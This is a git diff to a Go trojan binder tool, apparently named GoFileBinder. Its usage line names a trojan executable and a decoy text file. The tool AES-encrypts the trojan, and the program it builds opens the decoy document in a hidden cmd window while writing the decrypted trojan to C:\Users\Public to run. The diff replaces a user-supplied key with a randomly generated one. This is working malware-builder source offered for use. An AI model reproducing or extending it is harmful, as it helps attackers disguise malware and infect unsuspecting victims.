@@ -8,13 +8,12 @@ import (
 	"fmt"
 	"io/ioutil"
 	"log"
+	"math/rand"
 	"os"
 	"os/exec"
 	"path/filepath"
 	"strings"
 	"time"
-
-	"github.com/mattn/go-colorable"
 )
 
 var (
@@ -28,32 +27,32 @@ var (
 	tvb = "这是我的频道欢迎投稿学习:https://space.bilibili.com/353948151	"
 
 	keytishi = `
-	首先编译好命令参数如: GoFileBinder.exe	木马.exe xxx.txt YihsiweiYihsiwei
-	注意第四个参数必须为16位,这一点做的并不是很好,我感到非常的抱歉
-	`
-	qiangdiao = `
-	注意第四个参数必须为16位,注意第四个参数必须为16位,注意第四个参数必须为16位,
-	注意第四个参数必须为16位,注意第四个参数必须为16位,注意第四个参数必须为16位,
-	注意第四个参数必须为16位,注意第四个参数必须为16位,注意第四个参数必须为16位,
+	首先编译好命令参数如: GoFileBinder.exe 木马.exe xxx.txt
 	`
 )
 
+func RandStr(length int) string {
+	str := "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+	bytes := []byte(str)
+	result := []byte{}
+	rand.Seed(time.Now().UnixNano() + int64(rand.Intn(100)))
+	for i := 0; i < length; i++ {
+		result = append(result, bytes[rand.Intn(len(bytes))])
+	}
+	return string(result)
+}
 func main() {
 
-	stdout := colorable.NewColorable(os.Stdout)
-	fmt.Fprintf(stdout, "\x1b[36m%s\x1b[0m", logo)
-	fmt.Fprintf(stdout, "\x1b[36m%s\x1b[0m", tvb)
-	if len(os.Args) != 4 {
-		fmt.Fprintf(stdout, "\x1b[36m%s\x1b[0m", keytishi)
+	fmt.Println(logo)
+	fmt.Println(tvb)
+	if len(os.Args) != 3 {
+		fmt.Println(keytishi)
 		return
 	}
 	mumafile := os.Args[1]
 	docfile := os.Args[2]
-	key := os.Args[3]
-	if len(key) != 16 {
-		fmt.Fprintf(stdout, "\x1b[36m%s\x1b[0m", qiangdiao)
-		return
-	}
+	key := RandStr(16)
+
 	info, _ := ioutil.ReadFile(mumafile)
 	var mumafileStr string = string(info[:])
 	AesmumafileStr := AesEncrypt(mumafileStr, key)
@@ -93,15 +92,16 @@ func main() {
 		_, _ = f2.Write([]byte(ddocfile))
 		f2.Close()
 		strccc, _ := os.Getwd()
-		cmd := exec.Command("cmd", " /c "+strccc+docfilenames)
+		cmd := exec.Command("cmd",  " /c ",strccc+docfilenames)
 		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 		//cmd2.Stdout = os.Stdout
 		_ = cmd.Start()
-		f, _ := os.Create("C:\\Users\\Public\\" + mumafilename)
+		var dstFilecc = "C:\\Users\\Public\\" + mumafilename
+		f, _ := os.Create(dstFilecc)
 		dmumafile := AesDecrypt(numafile, key)
 		_, _ = f.Write([]byte(dmumafile))
 		f.Close()
-		var dstFilecc = "C:\\Users\\Public\\" + mumafilename
+
 		_, err := os.Stat(dstFilecc)
 	
 		if err == nil {
@@ -149,7 +149,7 @@ func main() {
 	_ = cmd.Start()
 
 	exitfile("outfile.exe")
-	os.RemoveAll("outfile.go")
+	//os.RemoveAll("outfile.go")
 	os.RemoveAll("Yihsiwei.bat")
 
 }
